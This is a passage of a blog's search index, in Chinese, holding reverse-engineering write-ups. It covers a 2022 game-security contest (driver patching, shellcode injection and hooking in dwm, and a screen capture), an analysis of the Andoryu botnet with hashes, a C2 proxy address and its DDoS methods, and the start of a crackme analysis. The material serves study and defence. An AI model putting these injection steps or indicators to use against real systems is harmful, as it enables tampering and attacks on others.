56 57 41 54 41 55 41 56 41 57 48 81 ?? ?? 00，该特征码经过pdb关联可知为PresentMultiplaneOverlay头部。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>调用ZwAllocateVirtualMemory对dwm申请可执行内存。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>并将shellcode拷贝至新内存中，并解密。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>然后会生成inline hook跳转代码，push xxxx ret</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>MDL映射Hook点内存并对其修改，即跳转到shellcode入口。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>然后延迟5秒后，还原hook，并且1.5秒后将shellcode清空。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>所有过程与初赛基本一致，包括绘制函数、初始化Shader、虚拟机代码，只不过虚拟机代码略有变动，因此不做详细分析。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<h1 id=\"实现方法\"><a href=\"#实现方法\" class=\"headerlink\" title=\"实现方法\"></a>实现方法</h1><p>实现之前，为了防止驱动清空shellcode和还原HOOK（让绘制一直显示），需要对sys进行patch。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>将红框代码进行nop填充后，得到如下代码。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>然后再将sys签名后加载。</p>\n<h2 id=\"一、修复表\"><a href=\"#一、修复表\" class=\"headerlink\" title=\"一、修复表\"></a>一、修复表</h2><p>原指令集存在加密，故直接dump解密好的。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>同样，直接将指令集进行模拟操作，并输出流程。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>运行后发现问题与初赛一致，首先是坐标被污染成了一个负值，然后就是key被互换，按照初赛的操作方式对表修复。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>然后写入表，获取表的地址也很简单，直接在HOOK头部拿到硬编码后进行跳转偏移计算即可。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>运行效果。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<h2 id=\"二、Hook绘制\"><a href=\"#二、Hook绘制\" class=\"headerlink\" title=\"二、Hook绘制\"></a>二、Hook绘制</h2><p>因为与初赛题一样，所以直接HOOK绘制。在初赛中获取旗帜的每个坐标和Key后写注入代码注入。</p>\n<table>\n<thead>\n<tr>\n<th>X</th>\n<th>Y</th>\n<th>Key (k1,k2)</th>\n<th>Col</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0x32</td>\n<td>0x32</td>\n<td>k1&#x3D;0x130BD0,k2&#x3D;0xF814B4</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x32</td>\n<td>0x6E</td>\n<td>k1&#x3D;0x1BCD69,k2&#x3D;0x7515C9</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x32</td>\n<td>0xAA</td>\n<td>k1&#x3D;0xD91997,k2&#x3D;0x87A34B</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x32</td>\n<td>0xE6</td>\n<td>k1&#x3D;0xE82B18,k2&#x3D;0x1CF400</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x32</td>\n<td>0x122</td>\n<td>k1&#x3D;0x391FAA,k2&#x3D;0x520EFE</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x32</td>\n<td>0x15E</td>\n<td>k1&#x3D;0xD77DE2,k2&#x3D;0xEBE72</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x6E</td>\n<td>0x6E</td>\n<td>k1&#x3D;0xD9E5F1,k2&#x3D;0xD1B52D</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0xAA</td>\n<td>0xAA</td>\n<td>k1&#x3D;0xC42D8B,k2&#x3D;0xB36FDF</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0xE6</td>\n<td>0xE6</td>\n<td>k1&#x3D;0x34CF2B,k2&#x3D;0x5B8FE7</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0x6E</td>\n<td>0xE6</td>\n<td>k1&#x3D;0x71150,k2&#x3D;0x788404</td>\n<td>0xFF2DDBE7</td>\n</tr>\n<tr>\n<td>0xAA</td>\n<td>0xE6</td>\n<td>k1&#x3D;0xC42E8B,k2&#x3D;0xC7371B</td>\n<td>0xFF2DDBE7</td>\n</tr>\n</tbody></table>\n<p>同样在HOOK头部拿到硬编码后进行跳转偏移计算拿到Draw地址，并在Draw函数执行前，用VEH进行HOOK调用。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p>注入后效果如下：</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p>因为题目要求为截图，不可拍照。又因为是dwm的绘制，因此普通截图无法截图。</p>\n<h2 id=\"一、GetBuffer\"><a href=\"#一、GetBuffer\" class=\"headerlink\" title=\"一、GetBuffer\"></a>一、GetBuffer</h2><p>直接通过SwapChain获取 Buffer保存。运行后会在E盘生成DDS文件，用VS打开直接是图片显示。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p>注入之后会在绘制前自动截图一次。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<h2 id=\"二、shellcode注入截图\"><a href=\"#二、shellcode注入截图\" class=\"headerlink\" title=\"二、shellcode注入截图\"></a>二、shellcode注入截图</h2><p>项目地址：<a href=\"https://github.com/lainswork/dwm-screen-shot\">https://github.com/lainswork/dwm-screen-shot</a></p>\n<p>但是存在一个问题，就是PresentMultiplaneOverlay的会存在HOOK失败，解决方法为直接将4个HOOK的函数Hash全部改成PresentMultiplaneOverlay的Hash即可。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<p>截图效果：</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n","categories":["Reverse"]},{"title":"2022游戏安全技术竞赛-初赛","url":"/2024/04/21/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/","content":"<h1 id=\"2022游戏安全技术竞赛-初赛\"><a href=\"#2022游戏安全技术竞赛-初赛\" class=\"headerlink\" title=\"2022游戏安全技术竞赛-初赛\"></a>2022游戏安全技术竞赛-初赛</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2022-4-27 13:59</li>\n</ul>\n<h1 id=\"运行效果：\"><a href=\"#运行效果：\" class=\"headerlink\" title=\"运行效果：\"></a>运行效果：</h1><p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>原程序运行后显示ACE，并且许秒后绘制消失。原题则要求如下：</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<h1 id=\"详细分析及实现：\"><a href=\"#详细分析及实现：\" class=\"headerlink\" title=\"详细分析及实现：\"></a>详细分析及实现：</h1><p>首先创建了一个名为”avoid repeat open”的互斥体，保证程序的单例执行。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>然后开始创建窗口，并初始化D3D设备。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>随后开始动态获取ZwAllocateVirtualMemory和ZwFreeVirtualMem的函数地址。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>调用ZwAllocateVirtualMemory申请一段可执行内存后，开始将两段shellcode写入。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/Untitled.png\" alt=\"Untitled\"></p>\n<p>紧接着可以看到通过调用GetTickCount来判断运行时间是否超过4秒，若超过4秒则清空shellcode，即绘制消失。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>shellcode的入口为D3D的一些shader初始化。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>动态编译shader完毕后开始执行虚拟机。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>简单分析了之后，可知每个分支作用如下：</p>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>寄存器相加。eg：v1+&#x3D;v2</td>\n</tr>\n<tr>\n<td>1</td>\n<td>两数相减。eg：v1-&#x3D;v2</td>\n</tr>\n<tr>\n<td>2</td>\n<td>寄存器赋值。eg：v1&#x3D;v2</td>\n</tr>\n<tr>\n<td>3</td>\n<td>立即数赋值。eg：v1&#x3D;999</td>\n</tr>\n<tr>\n<td>4</td>\n<td>计算key。</td>\n</tr>\n<tr>\n<td>5</td>\n<td>绘制黄色小方块</td>\n</tr>\n<tr>\n<td>6</td>\n<td>绘制青色小方块</td>\n</tr>\n<tr>\n<td>7</td>\n<td>函数返回</td>\n</tr>\n</tbody></table>\n<p>由于绘制青色方块正常，黄色方块不正常，故猜测黄色方块数据存在污染。</p>\n<p>进一步分析DrawFillRect函数，得知前四个参数中，第一第二个为坐标数据，第三第四个为Key。并且在捕获绘制青色方块的数据时发现，第三和第四个参数在参与运算时结果始终为0，反之，黄色方块不为0。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>将指令集扣下后使用C++进行模拟流程，并输出操作流程。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>经过对比，发现黄色方块在计算Decryp之后，将Table[6]与Table[7]的值进行了互换。直接通过判断互换流程将其修改为Table[3] &#x3D; Table[1]禁止互换。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>修改后发现仍然没有绘制黄色小方块，通过代码调试发现绘制时，Table[4]为负数，而Table[4] &#x3D; (Table[0] – Table[1]) &#x3D; 0x32 – 0x3E8。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>怀疑0x3E8为故意使坐标计算为负数，故将0x3E8修改为0x0后，黄色小方块显示。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>同理，第二个黄色方块的由于没有Key互换，但是对0x1F4计算，将0x1F4修改为0，后方块显示。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>经过手动修改后，发现存在0x3E8和0x1F4数据对黄色方块的坐标进行污染，将其修改0，并且禁止key互换后，旗帜显示。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>以下为C++修复表部分效果。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>修复完毕后会自动运行程序后执行修复表操作。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n","categories":["Reverse"]},{"title":"Andoryu Botnet僵尸网络样本分析","url":"/2024/04/21/Andoryu%20Botnet%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一、样本标签\"><a href=\"#一、样本标签\" class=\"headerlink\" title=\"一、样本标签\"></a>一、样本标签</h1><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>Andoryu.x86</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>00a8b3eed7356153ab93d2fd3366a60e</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>41.22 KB (42208 bytes)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>ELF 64-bit</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>无</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>c948b7115ddb0f44a196f11be08c025ca2379194</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>D0419ABA</td>\n</tr>\n<tr>\n<td>开源报告</td>\n<td><a href=\"https://mp.weixin.qq.com/s/YVwNHW3sGW8dpTymkp5Ivg\">https://mp.weixin.qq.com/s/YVwNHW3sGW8dpTymkp5Ivg</a></td>\n</tr>\n</tbody></table>\n<h1 id=\"二、详细分析\"><a href=\"#二、详细分析\" class=\"headerlink\" title=\"二、详细分析\"></a>二、详细分析</h1><h2 id=\"1、样本初始化\"><a href=\"#1、样本初始化\" class=\"headerlink\" title=\"1、样本初始化\"></a>1、样本初始化</h2><p>样本(00a8b3eed7356153ab93d2fd3366a60e)首先将自己的运行程序名伪装为<code>/bin/bash</code>,然后判断运行参数是否为2.</p>\n<p>![image-20230303174211936](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303174211936.png)</p>\n<p>然后初始化C2和通讯端口。</p>\n<p>![image-20230303174249169](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303174249169.png)</p>\n<p>运行初期将加密的字符串资源进行解密。</p>\n<p>![image-20230303174327423](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303174327423.png)</p>\n<p>该僵尸网络存在关键字符串为Andoryu Botnet，并且可以了解到编写者测试样本的时间为2022年12月30日。</p>\n<p>![QQ图片20230303174349](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;QQ图片20230303174349.png)</p>\n<p>接着创建无用户密码认证的socks5代理，代理服务器地址为之前解密出的152.67.66.37:1080。</p>\n<p>![image-20230303175334022](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175334022.png)</p>\n<p>并告知代理服务器需要访问哪个远程服务器，远程服务器地址批量解密时获取。</p>\n<p>![image-20230303175549406](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175549406.png)</p>\n<p>![image-20230303175616687](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175616687.png)</p>\n<p>设置接收数据监听。</p>\n<p>![image-20230303180045707](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303180045707.png)</p>\n<p>所有操作继续完毕后发送带有<code>本机IP+sha256(运行参数)</code>的上线包。</p>\n<p>![image-20230303175913680](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175913680.png)</p>\n<p>![image-20230303175918676](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175918676.png)</p>\n<p>其中本地IP通过DNS绑定查询。</p>\n<p>![image-20230303175937920](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303175937920.png)</p>\n<h2 id=\"2、接收消息解析\"><a href=\"#2、接收消息解析\" class=\"headerlink\" title=\"2、接收消息解析\"></a>2、接收消息解析</h2><p>样本接收到消息后开始继续解析指令后执行对应分支。其中数据有如下格式：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">recev_data</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">char</span>  sign[<span class=\"number\">7</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span>  type;\t\t</span><br><span class=\"line\">    <span class=\"type\">char</span>  cmd;</span><br><span class=\"line\">    <span class=\"type\">char</span>* data;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>经过详细分析可知cmd存在以下分支命令：</p>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0x20</td>\n<td>结束自身.</td>\n</tr>\n<tr>\n<td>0x11</td>\n<td>ddos攻击.</td>\n</tr>\n<tr>\n<td>0x15、0x16</td>\n<td>重新设置dest_c2,数据由接收原服务器发来指定.</td>\n</tr>\n<tr>\n<td>0x23</td>\n<td>仅当type&#x3D;&#x3D;0x20时,回传本地IP至远程服务器.</td>\n</tr>\n<tr>\n<td>0x22</td>\n<td>仅当type&#x3D;&#x3D;0x20时,关闭socket代理.</td>\n</tr>\n</tbody></table>\n<h2 id=\"3、DDOS攻击\"><a href=\"#3、DDOS攻击\" class=\"headerlink\" title=\"3、DDOS攻击\"></a>3、DDOS攻击</h2><p>样本支持多种DDoS方法，具体如下：</p>\n<table>\n<thead>\n<tr>\n<th><strong>Name</strong></th>\n<th><strong>Description</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>icmp-echo</td>\n<td>ICMP Flood</td>\n</tr>\n<tr>\n<td>udp-ovh</td>\n<td>UDP Flood for OVH</td>\n</tr>\n<tr>\n<td>udp-game</td>\n<td>UDP Game Flood</td>\n</tr>\n<tr>\n<td>udp-plain</td>\n<td>UDP Plain Flood</td>\n</tr>\n<tr>\n<td>tcp-raw</td>\n<td>TCP Flood</td>\n</tr>\n<tr>\n<td>tcp-socket</td>\n<td>TCP Syn Flood</td>\n</tr>\n<tr>\n<td>tcp-handshake</td>\n<td>TCP Flood</td>\n</tr>\n</tbody></table>\n<p>![image-20230303181055153](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230303181055153.png)</p>\n<p>样本根据攻击者服务器回传的数据进行选择DDOS类型，其中数据中指定了该DDOS类型所需要的参数。</p>\n<p>![image-20230306101153341](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230306101153341.png)</p>\n<p>然后发送数据包进行ddos攻击。</p>\n<p>![image-20230306100930569](..&#x2F;images&#x2F;Virus&#x2F;Andoryu Botnet僵尸网络样本分析&#x2F;image-20230306100930569.png)</p>\n","categories":["Virus"]},{"title":"CM分析-腾讯面试","url":"/2024/04/21/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/","content":"<h1 id=\"CM分析-腾讯面试\"><a href=\"#CM分析-腾讯面试\" class=\"headerlink\" title=\"CM分析-腾讯面试\"></a>CM分析-腾讯面试</h1><h1 id=\"一、反调试\"><a href=\"#一、反调试\" class=\"headerlink\" title=\"一、反调试\"></a>一、反调试</h1><h2 id=\"1、分析\"><a href=\"#1、分析\" class=\"headerlink\" 